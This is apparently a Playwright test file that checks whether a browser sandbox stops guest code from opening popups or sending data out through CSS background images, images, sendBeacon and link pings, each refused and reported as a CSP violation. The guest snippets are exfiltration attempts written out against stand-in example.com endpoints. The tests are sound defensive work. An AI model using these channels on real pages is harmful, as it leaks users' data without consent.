import { test, expect } from './fixture';

test.describe('Escape attempts', () => {
    test.beforeEach(async ({ sandbox }) => {
        await sandbox.mount();
    });

    test('cannot open popups by default', async ({ sandbox, context }) => {
        let popups = 0;
        context.on('page', () => popups++);

        // Chromium and WebKit return null, Firefox throws
        await sandbox.run(`
            try { console.log('POPUP ' + (window.open('about:blank') ? 'opened' : 'blocked')); }
            catch (e) { console.log('POPUP blocked'); }
        `);

        expect(await sandbox.waitForLog('POPUP')).toBe('POPUP blocked');
        expect(popups).toBe(0);
    });

    // Each refusal is asserted by its CSP violation, reported on the host (backlog S5), not by waiting
    // to see whether a route records a request: the route can miss guest requests (backlog T5).
    test('cannot exfiltrate via CSS background images: refused and reported', async ({ sandbox }) => {
        await sandbox.run(`
            const style = document.createElement('style');
            style.textContent = 'body { background-image: url("https://example.com/track"); }';
            document.head.appendChild(style);
        `);

        expect(await sandbox.waitForViolation('img-src', 'https://example.com/track')).toBeTruthy();
    });

    test('cannot exfiltrate via image or beacon: each refused and reported', async ({ sandbox }) => {
        const outcome = await sandbox.inGuest(`
            const img = await new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('refused'); i.src = 'https://example.com/img'; });
            let beacon;
            try { beacon = navigator.sendBeacon('https://example.com/beacon', 'x'); } catch (e) { beacon = 'threw ' + e.name; }
            return { img, beacon };
        `);

        expect(outcome.img).toBe('refused');
        // sendBeacon only queues: Chromium and WebKit return true and refuse the request afterwards,
        // Firefox returns false. The violation is the evidence in all three.
        expect(await sandbox.waitForViolation('img-src', 'https://example.com/img')).toBeTruthy();
        expect(await sandbox.waitForViolation('connect-src', 'https://example.com/beacon')).toBeTruthy();
    });

    test('cannot exfiltrate via link ping: refused and reported where the engine sends pings', async ({ sandbox, browserName }) => {
        // A fragment link keeps the guest document: with the inert about:blank base (S15) a bare '#' would
        // navigate the guest frame away, and the test would then observe nothing.
        await sandbox.run(`
            const a = document.createElement('a');
            a.href = 'about:srcdoc#ping'; a.ping = 'https://example.com/ping';
            document.body.appendChild(a); a.click();
            setTimeout(() => console.log('PING_CLICKED ' + location.href), 200); // Firefox moves to the fragment asynchronously
        `);
        expect(await sandbox.waitForLog('PING_CLICKED')).toBe('PING_CLICKED about:srcdoc#ping');

        if (browserName === 'firefox') {
            // Firefox does not send pings by default (browser.send_pings is off): nothing to refuse.
            await sandbox.page.waitForTimeout(500);
            expect(await sandbox.violations()).toEqual([]);
            return;
        }
        expect(await sandbox.waitForViolation('connect-src', 'https://example.com/ping')).toBeTruthy();
    });
});
